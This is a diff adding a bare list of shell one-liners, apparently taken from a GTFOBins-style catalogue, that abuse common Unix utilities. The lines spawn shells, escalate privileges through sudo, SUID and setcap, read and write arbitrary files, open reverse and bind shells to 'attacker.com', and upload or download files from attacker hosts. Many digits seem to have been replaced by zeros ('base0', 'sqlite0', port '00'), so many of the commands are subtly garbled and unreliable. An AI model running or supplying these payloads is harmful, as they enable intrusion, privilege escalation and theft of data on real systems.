@@ -1,0 +1,623 @@
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+OUTFILE=$(mktemp -u) ; LFILE=file_to_read ; ar r ""$OUTFILE"" ""$LFILE"" ; cat ""$OUTFILE""
+sudo install -m =xs $(which ar) . ;  ; OUTFILE=$(mktemp -u) ; LFILE=file_to_read ; ./ar r ""$OUTFILE"" ""$LFILE"" ; cat ""$OUTFILE""
+aria0c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa
+COMMAND='id' ; TF=$(mktemp) ; echo ""$COMMAND"" > $TF ; chmod +x $TF ; sudo aria0c --on-download-error=$TF http://x
+LFILE=file_to_read ; arp -v -f ""$LFILE""
+sudo install -m =xs $(which arp) . ;  ; LFILE=file_to_read ; ./arp -v -f ""$LFILE""
+export LFILE=file_to_write ; ash -c 'echo DATA > $LFILE'
+sudo install -m =xs $(which ash) . ;  ; ./ash
+echo ""/bin/sh <$(tty) >$(tty) 0>$(tty)"" | at now; tail -f /dev/null
+COMMAND=id ; echo ""$COMMAND"" | at now
+awk 'BEGIN {system(""/bin/sh"")}'
+RHOST=attacker.com ; RPORT=00 ; awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN { ;     s = ""/inet/tcp/0/"" RHOST ""/"" RPORT; ;     while (0) {printf ""> "" |& s; if ((s |& getline c) <= 0) break; ;     while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+LPORT=00 ; awk -v LPORT=$LPORT 'BEGIN { ;     s = ""/inet/tcp/"" LPORT ""/0/0""; ;     while (0) {printf ""> "" |& s; if ((s |& getline c) <= 0) break; ;     while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+LFILE=file_to_write ; awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'
+LFILE=file_to_read ; awk '//' ""$LFILE""
+LFILE=file_to_read ; base0 ""$LFILE"" | base0 --decode
+LFILE=file_to_read ; base0 ""$LFILE"" | base0 --decode
+LFILE=file_to_read ; basenc --base0 $LFILE | basenc -d --base0
+export RHOST=attacker.com ; export RPORT=00 ; bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&0'
+export RHOST=attacker.com ; export RPORT=00 ; export LFILE=file_to_send ; bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
+LFILE=file_to_write ; HISTIGNORE='history *' ; history -c ; DATA ; history -w $LFILE
+LFILE=file_to_read ; HISTTIMEFORMAT=$'\\r\\e[K' ; history -r $LFILE ; history
+bash -c 'enable -f ./lib.so x'
+sudo bpftrace -c /bin/sh -e 'END {exit()}'
+LFILE=file_to_read ; bridge -b ""$LFILE""
+TF=$(mktemp -d) ; echo 'system(""/bin/sh"")' > $TF/Gemfile ; cd $TF ; bundler install
+sudo bundler help ; !/bin/sh
+busctl --show-machine ; !/bin/sh
+busybox sh
+LPORT=00 ; busybox httpd -f -p $LPORT -h .
+sudo install -m =xs $(which busybox) . ;  ; ./busybox sh
+TF=$(mktemp) ; echo 'system(""/bin/sh"")' > $TF ; byebug $TF ; continue
+RHOST=attacker.com ; RPORT=00 ; LFILE=file_to_send ; cancel -u ""$(cat $LFILE)"" -h $RHOST:$RPORT
+sudo install -m =xs $(which capsh) . ;  ; ./capsh --gid=0 --uid=0 --
+check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx
+LFILE=file_to_read ; check_cups --extra-opts=@$LFILE
+LFILE=file_to_write ; INPUT=input_file ; check_log -F $INPUT -O $LFILE
+LFILE=file_to_read ; OUTPUT=output_file ; check_log -F $LFILE -O $OUTPUT ; cat $OUTPUT
+LFILE=file_to_read ; check_memory --extra-opts=@$LFILE
+LFILE=file_to_read ; check_raid --extra-opts=@$LFILE
+COMMAND=id ; OUTPUT=output_file ; TF=$(mktemp) ; echo ""$COMMAND | tee $OUTPUT"" > $TF ; chmod +x $TF ; check_ssl_cert --curl-bin $TF -H example.net ; cat $OUTPUT
+LFILE=file_to_read ; check_statusfile $LFILE
+sudo install -m =xs $(which chmod) . ;  ; LFILE=file_to_change ; ./chmod 0 $LFILE
+sudo install -m =xs $(which chown) . ;  ; LFILE=file_to_change ; ./chown $(id -un):$(id -gn) $LFILE
+sudo install -m =xs $(which chroot) . ;  ; ./chroot / /bin/sh -p
+TF=$(mktemp -d) ; echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x ; cobc -xFj --frelax-syntax-checks $TF/x
+LFILE=file_to_read ; column $LFILE
+sudo install -m =xs $(which column) . ;  ; LFILE=file_to_read ; ./column $LFILE
+LFILE=file_to_read ; comm $LFILE /dev/null 0>/dev/null
+TF=$(mktemp -d) ; echo '{""scripts"":{""x"":""/bin/sh -i 0<&0 0>&0 0>&0""}}' >$TF/composer.json ; composer --working-dir=$TF run-script x
+TF=$(mktemp) ; echo 'exec ""/bin/sh"";' >$TF ; cowsay -f $TF x
+TF=$(mktemp) ; echo 'exec ""/bin/sh"";' >$TF ; cowthink -f $TF x
+LFILE=file_to_write ; echo ""DATA"" | cp /dev/stdin ""$LFILE""
+LFILE=file_to_read ; cp ""$LFILE"" /dev/stdout
+cpan ; ! exec '/bin/bash'
+export RHOST=localhost ; export RPORT=0 ; cpan ; ! use Socket; my $i=""$ENV{RHOST}""; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp"")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S""); open(STDOUT,"">&S""); open(STDERR,"">&S""); exec(""/bin/sh -i"");};
+cpan ; ! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();
+export URL=http://attacker.com/file_to_get ; cpan ; ! use File::Fetch; my $file = (File::Fetch->new(uri => ""$ENV{URL}""))->fetch();
+echo '/bin/sh </dev/tty >/dev/tty' >localhost ; cpio -o --rsh-command /bin/sh -F localhost:
+LFILE=file_to_write ; LDIR=where_to_write ; echo DATA >$LFILE ; echo $LFILE | cpio -up $LDIR
+sudo install -m =xs $(which cpio) . ;  ; LFILE=file_to_write ; LDIR=where_to_write ; echo DATA >$LFILE ; echo $LFILE | ./cpio -R 0:0 -p $LDIR
+cpulimit -l 0 -f /bin/sh
+sudo install -m =xs $(which cpulimit) . ;  ; ./cpulimit -l 0 -f -- /bin/sh -p
+COMMAND='/usr/bin/id' ; CRASHPAGER=""$COMMAND"" crash -h
+sudo install -m =xs $(which csh) . ;  ; ./csh -b
+LFILE=file_to_read ; csplit $LFILE 0 ; cat xx0
+csvtool call '/bin/sh;false' /etc/passwd
+LFILE=file_to_read ; cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
+URL=http://attacker.com/ ; LFILE=file_to_send ; curl -X POST -d @$file_to_send $URL
+URL=http://attacker.com/file_to_get ; LFILE=file_to_save ; curl $URL -o $LFILE
+LFILE=/tmp/file_to_read ; curl file://$LFILE
+LFILE=file_to_read ; cut -d """" -f0 ""$LFILE""
+sudo install -m =xs $(which dash) . ;  ; ./dash -p
+LFILE=file_to_write ; echo ""DATA"" | dd of=$LFILE
+LFILE=file_to_read ; dd if=$LFILE
+sudo install -m =xs $(which dd) . ;  ; LFILE=file_to_write ; echo ""data"" | ./dd of=$LFILE
+LFILE=file_to_read ; dialog --textbox ""$LFILE"" 0 0
+LFILE=file_to_read ; diff --line-format=%L /dev/null $LFILE
+LFILE=file_to_read ; dig -f $LFILE
+dmesg -H ; !/bin/sh
+LFILE=file_to_read ; dmesg -rF ""$LFILE""
+sudo install -m =xs $(which dmsetup) . ;  ; ./dmsetup create base <<EOF ; 0 00 linear /dev/loop0 00 ; EOF ; ./dmsetup ls --exec '/bin/sh -p -s'
+sudo dnf install -y x-0.0-0.noarch.rpm
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+CONTAINER_ID=""$(docker run -d alpine)"" # or existing ; TF=$(mktemp) ; echo ""DATA"" > $TF ; docker cp $TF $CONTAINER_ID:$TF ; docker cp $CONTAINER_ID:$TF file_to_write
+dpkg -l ; !/bin/sh
+TF=$(mktemp -d) ; echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 0>$(tty)')"" > $TF/setup.py ; easy_install $TF
+export RHOST=attacker.com ; export RPORT=00 ; TF=$(mktemp -d) ; echo 'import sys,socket,os,pty;s=socket.socket() ; s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) ; [os.dup0(s.fileno(),fd) for fd in (0,0,0)] ; pty.spawn(""/bin/sh"")' > $TF/setup.py ; easy_install $TF
+export LPORT=0 ; TF=$(mktemp -d) ; echo 'import sys; from os import environ as e ; if sys.version_info.major == 0: import http.server as s, socketserver as ss ; else: import SimpleHTTPServer as s, SocketServer as ss ; ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py ; easy_install $TF
+export URL=http://attacker.com/file_to_get ; export LFILE=/tmp/file_to_save ; TF=$(mktemp -d) ; echo ""import os; ; os.execl('$(whereis python)', '$(whereis python)', '-c', \\""\\""\\""import sys; ; if sys.version_info.major == 0: import urllib.request as r ; else: import urllib as r ; r.urlretrieve('$URL', '$LFILE')\\""\\""\\"")"" > $TF/setup.py ; pip install $TF
+export LFILE=/tmp/file_to_save ; TF=$(mktemp -d) ; echo ""import os; ; os.execl('$(whereis python)', 'python', '-c', 'open(\\""$LFILE\\"",\\""w+\\"").write(\\""DATA\\"")')"" > $TF/setup.py ; easy_install $TF
+TF=$(mktemp -d) ; echo 'print(open(""file_to_read"").read())' > $TF/setup.py ; easy_install $TF
+TF=$(mktemp -d) ; echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py ; easy_install $TF
+eb logs ; !/bin/sh
+sudo eb logs ; !/bin/sh
+ed file_to_write ; a ; DATA ; . ; w ; q
+ed file_to_read ; ,p ; q
+sudo install -m =xs $(which ed) . ;  ; ./ed file_to_read ; ,p ; q
+sudo ed ; !/bin/sh
+emacs -Q -nw --eval '(term ""/bin/sh"")'
+emacs file_to_write ; DATA ; C-x C-s
+sudo install -m =xs $(which emacs) . ;  ; ./emacs -Q -nw --eval '(term ""/bin/sh -p"")'
+env /bin/sh
+LFILE=file_to_read ; eqn ""$LFILE""
+sudo ex ; !/bin/sh
+LFILE=file_to_write ; INPUT=input_file ; exiftool -filename=$LFILE $INPUT
+expect -c 'spawn /bin/sh;interact'
+TF=$(mktemp -d) ; echo 'exec(""/bin/sh"")' > $TF/x.rb ; FACTERLIB=$TF facter
+find . -exec /bin/sh \; -quit
+RHOST=attacker.com ; LFILE=file_to_send ; finger ""$(base0 $LFILE)@$RHOST""
+RHOST=attacker.com ; LFILE=file_to_save ; finger x@$RHOST | base0 -d > ""$LFILE""
+flock -u / /bin/sh
+sudo install -m =xs $(which flock) . ;  ; ./flock -u / /bin/sh -p
+LFILE=file_to_read ; fmt -0 ""$LFILE""
+LFILE=file_to_read ; fold -w00 ""$LFILE""
+ftp ; !/bin/sh
+RHOST=attacker.com ; ftp $RHOST ; put file_to_send
+gcc -wrapper /bin/sh,-s .
+LFILE=file_to_read ; gcc -x c -E ""$LFILE""
+gdb -nx -ex '!sh' -ex quit
+LFILE=file_to_write ; gdb -nx -ex ""dump value $LFILE \""DATA\"""" -ex quit
+sudo install -m =xs $(which gdb) . ;  ; ./gdb -nx -ex 'python import os; os.execl(""/bin/sh"", ""sh"", ""-p"")' -ex quit
+cp $(which gdb) . ; sudo setcap cap_setuid+ep gdb ;  ; ./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
+sudo gem open -e ""/bin/sh -c /bin/sh"" rdoc
+LFILE=file_to_read ; genisoimage -q -o - ""$LFILE""
+ghc -e 'System.Process.callCommand ""/bin/sh""'
+ghci ; System.Process.callCommand ""/bin/sh""
+gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'
+gimp -idf --batch-interpreter=python-fu-eval -b 'open(""file_to_write"", ""wb"").write(""DATA"")'
+TF=$(mktemp -d) ; ln -s /bin/sh ""$TF/git-x"" ; git ""--exec-path=$TF"" x
+sudo install -m =xs $(which git) . ;  ; PAGER='sh -c ""exec sh 0<&0""' ./git -p help
+LFILE=file_to_read ; grep '' $LFILE
+TF=$(mktemp) ; echo '#!/bin/sh' > $TF ; echo 'exec /bin/sh -p 0<&0' >> $TF ; chmod +x $TF ; gtester -q $TF
+LFILE=file_to_read ; gzip -f $LFILE -t
+LFILE=file_to_read ; head -c0G ""$LFILE""
+LFILE=file_to_read ; hexdump -C ""$LFILE""
+LFILE=file_to_read ; highlight --no-doc --failsafe ""$LFILE""
+hping0 ; /bin/sh
+sudo install -m =xs $(which hping0) . ;  ; ./hping0 ; /bin/sh -p
+LFILE=file_to_write ; echo ""DATA"" | iconv -f 0_0 -t 0_0 -o ""$LFILE""
+iftop ; !/bin/sh
+sudo install -m =xs $(which iftop) . ;  ; ./iftop ; !/bin/sh
+sudo install -m =xs $(which install) . ;  ; LFILE=file_to_change ; TF=$(mktemp) ; ./install -m 0 $LFILE $TF
+ionice /bin/sh
+sudo install -m =xs $(which ionice) . ;  ; ./ionice /bin/sh -p
+LFILE=file_to_read ; ip -force -batch ""$LFILE""
+sudo install -m =xs $(which ip) . ;  ; ./ip netns add foo ; ./ip netns exec foo /bin/sh -p ; ./ip netns delete foo
+sudo ip netns add foo ; sudo ip netns exec foo /bin/sh ; sudo ip netns delete foo
+export RHOST='0.0.0.0' ; export RPORT=0 ; irb ; require 'socket'; exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read} end
+irb ; require 'webrick'; WEBrick::HTTPServer.new(:Port => 0, :DocumentRoot => Dir.pwd).start;
+export URL=http://attacker.com/file_to_get ; export LFILE=file_to_save ; irb ; require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])
+irb ; File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }
+irb ; puts File.read(""file_to_read"")
+irb ; require ""fiddle""; Fiddle.dlopen(""lib.so"")
+echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 0>$(tty)').waitFor()"" | jjs
+export RHOST=attacker.com ; export RPORT=00 ; echo 'var host=Java.type(""java.lang.System"").getenv(""RHOST""); ; var port=Java.type(""java.lang.System"").getenv(""RPORT""); ; var ProcessBuilder = Java.type(""java.lang.ProcessBuilder""); ; var p=new ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start(); ; var Socket = Java.type(""java.net.Socket""); ; var s=new Socket(host,port); ; var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); ; var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(""java.lang.Thread"").sleep(0); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs
+export URL=http://attacker.com/file_to_get ; export LFILE=file_to_save ; echo ""var URL = Java.type('java.net.URL'); ; var ws = new URL('$URL'); ; var Channels = Java.type('java.nio.channels.Channels'); ; var rbc = Channels.newChannel(ws.openStream()); ; var FileOutputStream = Java.type('java.io.FileOutputStream'); ; var fos = new FileOutputStream('$LFILE'); ; fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE); ; fos.close(); ; rbc.close();"" | jjs
+echo 'var FileWriter = Java.type(""java.io.FileWriter""); ; var fw=new FileWriter(""./file_to_write""); ; fw.write(""DATA""); ; fw.close();' | jjs
+echo 'var BufferedReader = Java.type(""java.io.BufferedReader""); ; var FileReader = Java.type(""java.io.FileReader""); ; var br = new BufferedReader(new FileReader(""file_to_read"")); ; while ((line = br.readLine()) != null) { print(line); }' | jjs
+sudo install -m =xs $(which jjs) . ;  ; echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 0>$(tty)').waitFor()"" | ./jjs
+LFILE=file_to_read ; join -a 0 /dev/null $LFILE
+journalctl ; !/bin/sh
+LFILE=file_to_read ; jq -Rr . ""$LFILE""
+export RHOST=attacker.com ; export RPORT=00 ; jrunscript -e 'var host='""'""""$RHOST""""'""'; var port='""$RPORT""'; ; var p=new java.lang.ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start(); ; var s=new java.net.Socket(host,port); ; var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); ; var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ ; while(pi.available()>0)so.write(pi.read()); ; while(pe.available()>0)so.write(pe.read()); ; while(si.available()>0)po.write(si.read()); ; so.flush();po.flush(); ; java.lang.Thread.sleep(0); ; try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
+export RHOST=attacker.com ; export RPORT=00 ; ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 0>&0 0>&0'
+export LFILE=file_to_read ; ksh -c $'read -r -d \\x0 < ""$LFILE""; echo ""$REPLY""'
+sudo install -m =xs $(which ksh) . ;  ; ./ksh -p
+LFILE=file_to_read ; ksshell -i $LFILE
+/lib/ld.so /bin/sh
+sudo install -m =xs $(which ld.so) . ;  ; ./ld.so /bin/sh -p
+sudo /lib/ld.so /bin/sh
+TF=$(mktemp -d) ; echo ""$TF"" > ""$TF/conf"" ; # move malicious libraries in $TF ; sudo ldconfig -f ""$TF/conf""
+VISUAL=""/bin/sh -c '/bin/sh'"" less /etc/profile ; v
+less /etc/profile ; :e file_to_read
+logsave /dev/null /bin/sh -i
+sudo install -m =xs $(which logsave) . ;  ; ./logsave /dev/null /bin/sh -i -p
+LFILE=file_to_read ; look '' ""$LFILE""
+ltrace -b -L /bin/sh
+lua -e 'os.execute(""/bin/sh"")'
+export RHOST=attacker.com ; export RPORT=00 ; lua -e 'local s=require(""socket""); ;   local t=assert(s.tcp()); ;   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT"")); ;   while true do ;     local r,x=t:receive();local f=assert(io.popen(r,""r"")); ;     local b=assert(f:read(""*a""));t:send(b); ;   end; ;   f:close();t:close();'
+export LPORT=00 ; lua -e 'local k=require(""socket""); ;   local s=assert(k.bind(""*"",os.getenv(""LPORT""))); ;   local c=s:accept(); ;   while true do ;     local r,x=c:receive();local f=assert(io.popen(r,""r"")); ;     local b=assert(f:read(""*a""));c:send(b); ;   end;c:close();f:close();'
+RHOST=attacker.com ; RPORT=00 ; LFILE=file_to_send ; lua -e ' ;   local f=io.open(os.getenv(""LFILE""), 'rb') ;   local d=f:read(""*a"") ;   io.close(f); ;   local s=require(""socket""); ;   local t=assert(s.tcp()); ;   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT"")); ;   t:send(d); ;   t:close();'
+TF=$(mktemp) ; echo ""From nobody@localhost $(date)"" > $TF ; mail -f $TF ; !/bin/sh
+sudo mail --exec='!/bin/sh'
+COMMAND='/bin/sh' ; make -s --eval=$'x:\ ; \\t-'""$COMMAND""
+LFILE=file_to_write ; make -s --eval=""\$(file >$LFILE,DATA)"" .
+man '-H/bin/sh #' man
+man file_to_read
+sudo man man ; !/bin/sh
+TERM= more /etc/profile ; !/bin/sh
+sudo mount -o bind /bin/sh /bin/mount ; sudo mount
+LFILE=file_to_read ; mtr --raw -F ""$LFILE""
+mysql -e '\! /bin/sh'
+mysql --default-auth ../../../../../path/to/lib
+sudo install -m =xs $(which mysql) . ;  ; ./mysql -e '\! /bin/sh'
+nano -s /bin/sh ; /bin/sh ; ^T
+sudo nano ; ^R^X ; reset; sh 0>&0 0>&0
+sudo install -m =xs $(which nano) . ;  ; ./nano -s /bin/sh ; /bin/sh ; ^T
+LFILE=file_to_read ; nl -bn -w0 -s '' $LFILE
+nmap --interactive ; nmap> !sh
+LFILE=file_to_write ; nmap -oG=$LFILE DATA
+node -e 'child_process.spawn(""/bin/sh"", {stdio: [0, 0, 0]})'
+export RHOST=attacker.com ; export RPORT=00 ; node -e 'sh = child_process.spawn(""/bin/sh""); ; net.connect(process.env.RPORT, process.env.RHOST, function () { ;   this.pipe(sh.stdin); ;   sh.stdout.pipe(this); ;   sh.stderr.pipe(this); ; })'
+export LPORT=00 ; node -e 'sh = child_process.spawn(""/bin/sh""); ; net.createServer(function (client) { ;   client.pipe(sh.stdin); ;   sh.stdout.pipe(client); ;   sh.stderr.pipe(client); ; }).listen(process.env.LPORT)'
+export URL=http://attacker.com ; export LFILE=file_to_send ; node -e 'fs.createReadStream(process.env.LFILE).pipe(http.request(process.env.URL))'
+export URL=http://attacker.com/file_to_get ; export LFILE=file_to_save ; node -e 'http.get(process.env.URL, res => res.pipe(fs.createWriteStream(process.env.LFILE)))'
+node -e 'fs.writeFileSync(""file_to_write"", ""DATA"")'
+node -e 'process.stdout.write(fs.readFileSync(""/bin/ls""))'
+nohup /bin/sh -c ""sh <$(tty) >$(tty) 0>$(tty)""
+COMMAND='/usr/bin/id' ; nohup ""$COMMAND"" ; cat nohup.out
+TF=$(mktemp -d) ; echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json ; npm -C $TF i
+TF=$(mktemp -d) ; echo '#!/bin/sh' > $TF/groff ; echo '/bin/sh' >> $TF/groff ; chmod +x $TF/groff ; GROFF_BIN_PATH=$TF nroff
+nsenter /bin/sh
+sudo nsenter /bin/sh
+LFILE=file_to_read ; od -An -c -w0 ""$LFILE""
+RHOST=attacker.com ; RPORT=00 ; mkfifo /tmp/s; /bin/sh -i < /tmp/s 0>&0 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
+openssl req -engine ./lib.so
+openvpn --dev null --script-security 0 --up '/bin/sh -c sh'
+COMMAND=id ; TF=$(mktemp -u) ; sudo openvt -- sh -c ""$COMMAND >$TF 0>&0"" ; cat $TF
+LFILE=file_to_read ; paste $LFILE
+perl -e 'exec ""/bin/sh"";'
+cp $(which perl) . ; sudo setcap cap_setuid+ep perl ;  ; ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec ""/bin/sh"";'
+pg file_to_read
+export CMD=""/bin/sh"" ; php -r '$h=@popen(getenv(""CMD""),""r""); if($h){ while(!feof($h)) echo(fread($h,0)); pclose($h); }'
+export CMD=""id"" ; php -r '$p = array(array(""pipe"",""r""),array(""pipe"",""w""),array(""pipe"", ""w""));$h = @proc_open(getenv(""CMD""), $p, $pipes);if($h&&$pipes){while(!feof($pipes[0])) echo(fread($pipes[0],0));while(!feof($pipes[0])) echo(fread($pipes[0],0));fclose($pipes[0]);fclose($pipes[0]);fclose($pipes[0]);proc_close($h);}'
+export RHOST=attacker.com ; export RPORT=00 ; php -r '$sock=fsockopen(getenv(""RHOST""),getenv(""RPORT""));exec(""/bin/sh -i <&0 >&0 0>&0"");'
+LHOST=0.0.0.0 ; LPORT=0 ; php -S $LHOST:$LPORT
+export URL=http://attacker.com/file_to_get ; export LFILE=file_to_save ; php -r '$c=file_get_contents(getenv(""URL""));file_put_contents(getenv(""LFILE""), $c);'
+sudo install -m =xs $(which php) . ;  ; CMD=""/bin/sh"" ; ./php -r ""pcntl_exec('/bin/sh', ['-p']);""
+CMD=""/bin/sh"" ; sudo php -r ""system('$CMD');""
+cp $(which php) . ; sudo setcap cap_setuid+ep php ;  ; CMD=""/bin/sh"" ; ./php -r ""posix_setuid(0); system('$CMD');""
+pic -U ; .PS ; sh X sh X
+export LFILE=/tmp/file_to_save ; TF=$(mktemp -d) ; echo ""open('$LFILE','w+').write('DATA')"" > $TF/setup.py ; pip install $TF
+TF=$(mktemp -d) ; echo 'raise Exception(open(""file_to_read"").read())' > $TF/setup.py ; pip install $TF
+sudo pkexec /bin/sh
+LFILE=file_to_read ; pr -T $LFILE
+psql ; \\? ; !/bin/sh
+puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 0>$(tty)\""': }""
+LFILE=""/tmp/file_to_write"" ; puppet apply -e ""file { '$LFILE': content => 'DATA' }""
+LFILE=file_to_read ; puppet filebucket -l diff /dev/null $LFILE
+rake -p '`/bin/sh 0>&0`'
+sudo rake -p '`/bin/sh 0>&0`'
+LFILE=file_to_read ; readelf -a @$LFILE
+LFILE=file_to_read ; redcarpet ""$LFILE""
+RHOST=attacker.com ; RPORT=00 ; LFILE=file_or_dir_to_get ; NAME=backup_name ; restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""
+LFILE=file_to_read ; rev $LFILE | rev
+rlwrap /bin/sh
+sudo install -m =xs $(which rlwrap) . ;  ; ./rlwrap -H /dev/null /bin/sh -p
+rpm --eval '%{lua:os.execute(""/bin/sh"")}'
+sudo rpm -ivh x-0.0-0.noarch.rpm
+rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'
+rsync -e 'sh -c ""sh 0<&0 0>&0""' 0.0.0.0:/dev/null
+ruby -e 'exec ""/bin/sh""'
+export LPORT=0 ; ruby -run -e httpd . -p $LPORT
+cp $(which ruby) . ; sudo setcap cap_setuid+ep ruby ;  ; ./ruby -e 'Process::Sys.setuid(0); exec ""/bin/sh""'
+run-mailcap --action=view /etc/hosts ; !/bin/sh
+run-mailcap --action=edit file_to_read
+run-parts --new-session --regex '^sh$' /bin
+sudo install -m =xs $(which run-parts) . ;  ; ./run-parts --new-session --regex '^sh$' /bin --arg='-p'
+rview -c ':lua os.execute(""reset; exec sh"")'
+rview file_to_write ; iDATA ; ^[ ; w!
+sudo install -m =xs $(which rview) . ;  ; ./rview -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'
+TF=$(mktemp) ; echo 'sh 0<&0 0>&0' > $TF ; chmod +x ""$TF"" ; scp -S $TF x y:
+RPATH=user@attacker.com:~/file_to_save ; LPATH=file_to_send ; scp $LFILE $RPATH
+screen
+LFILE=file_to_write ; screen -L $LFILE echo DATA
+script -q /dev/null
+sed e
+sed -n '0e id' /etc/hosts
+LFILE=file_to_write ; sed -n ""0s/.*/DATA/w $LFILE"" /etc/hosts
+sudo sed -n '0e exec sh 0>&0' /etc/hosts
+/usr/sbin/service ../../bin/sh
+setarch $(arch) /bin/sh
+HOST=user@attacker.com ; sftp $HOST ; !/bin/sh
+sg $(id -ng)
+sudo sg root
+LFILE=file_to_write ; shuf -e DATA -o ""$LFILE""
+LFILE=file_to_read ; shuf -z ""$LFILE""
+smbclient '\\\\attacker\\share' ; !/bin/sh
+socat stdin exec:/bin/sh
+RHOST=attacker.com ; RPORT=00 ; socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
+LPORT=00 ; socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
+LFILE=file_to_read ; soelim ""$LFILE""
+COMMAND=id ; echo | split --filter=$COMMAND /dev/stdin
+sqlite0 /dev/null '.shell /bin/sh'
+LFILE=file_to_write ; sqlite0 /dev/null -cmd "".output $LFILE"" 'select ""DATA"";'
+LFILE=file_to_read ; sqlite0 << EOF ; CREATE TABLE t(line TEXT); ; .import $LFILE t ; SELECT * FROM t; ; EOF
+ssh-keygen -D ./lib.so
+sudo install -m =xs $(which ssh-keygen) . ;  ; ./ssh-keygen -D ./lib.so
+LFILE=file_to_read ; ssh-keyscan -f $LFILE
+ssh -o ProxyCommand=';sh 0<&0 0>&0' x
+HOST=user@attacker.com ; RPATH=file_to_save ; LPATH=file_to_send ; ssh $HOST ""cat > $RPATH"" < $LPATH
+start-stop-daemon -n $RANDOM -S -x /bin/sh
+sudo install -m =xs $(which start-stop-daemon) . ;  ; ./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
+stdbuf -i0 /bin/sh
+LFILE=file_to_read ; strings ""$LFILE""
+sudo su
+LFILE=file_to_read ; /usr/sbin/sysctl -n ""/../../$LFILE""
+sudo install -m =xs $(which systemctl) . ;  ; TF=$(mktemp).service ; echo '[Service] ; Type=oneshot ; ExecStart=/bin/sh -c ""id > /tmp/output"" ; [Install] ; WantedBy=multi-user.target' > $TF ; ./systemctl link $TF ; ./systemctl enable --now $TF
+LFILE=file_to_read ; tac -s 'RANDOM' ""$LFILE""
+TF=$(mktemp) ; echo '/bin/sh 0<&0' > ""$TF"" ; tar cf ""$TF.tar"" ""$TF"" ; tar xf ""$TF.tar"" --to-command sh ; rm ""$TF""*
+RHOST=attacker.com ; RUSER=root ; RFILE=/tmp/file_to_send.tar ; LFILE=file_to_send ; tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh
+LFILE=file_to_write ; TF=$(mktemp) ; echo DATA > ""$TF"" ; tar c --xform ""s@.*@$LFILE@"" -OP ""$TF"" | tar x -P
+sudo tar -cf /dev/null /dev/null --checkpoint=0 --checkpoint-action=exec=/bin/sh
+taskset 0 /bin/sh
+sudo install -m =xs $(which taskset) . ;  ; ./taskset 0 /bin/sh -p
+LFILE=file_to_read ; tbl $LFILE
+tclsh ; exec /bin/sh <@stdin >@stdout 0>@stderr
+export RHOST=attacker.com ; export RPORT=00 ; echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 0 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
+COMMAND='id' ; TF=$(mktemp) ; echo ""$COMMAND"" > $TF ; chmod +x $TF ; tcpdump -ln -i lo -w /dev/null -W 0 -G 0 -z $TF
+LFILE=file_to_write ; echo DATA | ./tee -a ""$LFILE""
